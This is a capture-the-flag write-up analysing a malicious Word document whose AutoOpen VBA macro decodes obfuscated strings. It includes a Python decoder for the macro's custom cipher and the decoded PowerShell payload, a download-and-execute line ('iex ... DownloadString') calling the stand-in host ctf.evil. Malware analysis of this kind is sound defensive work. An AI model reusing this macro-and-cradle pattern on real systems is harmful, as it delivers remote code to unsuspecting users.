# New Email

> Category: Mixed Offensive / macro-ish reversing. Event: SANS European Championship 2026.

This one was a fake Outlook login doc. The file came passworded with `infected`, which is always the challenge author saying "yes yes it is malware looking, dont panic".

Flag:

```text
mne{0bfu5c473d_vb4_n3v3r_6375_0ld}
```

## Files

The file trail is in [files/](files/).

- [files/MANIFEST.md](files/MANIFEST.md) has the full list
- `files/artifacts/` has the original zipped doc artifact and extracted DOCX internals
- `files/scripts/solve.py` is the decoder path
- `files/original/` has prompt and flag, for quick checking

## Challenge

Brief said IT sent some new login page instructions. The artifact was:

```text
New Outlook Login.docx
```

Inside the zip was `word/vbaProject.bin`, so the real work was VBA, not Word content.

## First look

Unzip the docx:

```bash
unzip "New Outlook Login.docx" -d docx_extract
ls docx_extract/word
```

Then pull macros:

```bash
olevba "New Outlook Login.docx"
```

The macro had an `AutoOpen` path and strings passed into a weird decoder:

```vb
Set obj = CreateObject(rghArP85CL("ivPlUuC4dhzSqPBW+PpfXQ=="))
obj.Run rghArP85CL("uK3RX6K1WVa4LlpV4CVSF7ii8RFosWBU...")
```

First thought: base64 strings, easy. Not exactly. Base64 only gave the encrypted/encoded bytes. There was still a custom transform.

## The small cipher

The function `rghArP85CL` did this:

1. base64 decode
2. process data in 4 byte little-endian blocks
3. run a TEA-looking bit mixer
4. strip trailing `~`

The Python emulator was enough:

```python
from base64 import b64decode

MASK = 0xffffffff

def rshift32(v, n):
    return (v & MASK) >> n

def lshift32(v, n):
    return ((v & MASK) << n) & MASK

def hRmz(x):
    c1 = 5570645
    c2 = 52428
    d1, d2 = 7, 14
    x &= MASK
    t = (x ^ rshift32(x, d2)) & c2
    u = x ^ t ^ lshift32(t, d2)
    t = (u ^ rshift32(u, d1)) & c1
    return (u ^ t ^ lshift32(t, d1)) & MASK

def decode(s):
    raw = b64decode(s)
    out = bytearray()
    for i in range(0, len(raw), 4):
        b = raw[i:i+4]
        if len(b) < 4:
            break
        x = b[3] << 24 | b[2] << 16 | b[1] << 8 | b[0]
        y = hRmz(x)
        out += bytes([y & 255, (y >> 8) & 255, (y >> 16) & 255, (y >> 24) & 255])
    return bytes(out).rstrip(b"~")
```

The first string decoded to:

```text
WScript.Shell
```

Ok, so `.Run` is going to spawn something. Great. Normal enterprise email things.

## Payload

The second string decoded to a PowerShell command:

```text
powershell.exe -enc <base64>
```

That `-enc` is UTF-16LE base64. Decoding it gave:

```powershell
iex ((New-Object Net.WebClient).DownloadString(
  'http://ctf.evil/mne{0bfu5c473d_vb4_n3v3r_6375_0ld}'))
```

And the flag was just sitting in the fake URL. Kinda rude, but we take those.

## Why it worked

The macro used layers that look more serious than they are. Base64 plus custom bit mixing plus PowerShell encoding. Each layer is not hard, it just makes you tired.

The fix in real life is obvious and boring: dont trust Office macros, block internet-spawning macros, inspect `AutoOpen`, and dont let `WScript.Shell.Run` be a normal Tuesday.
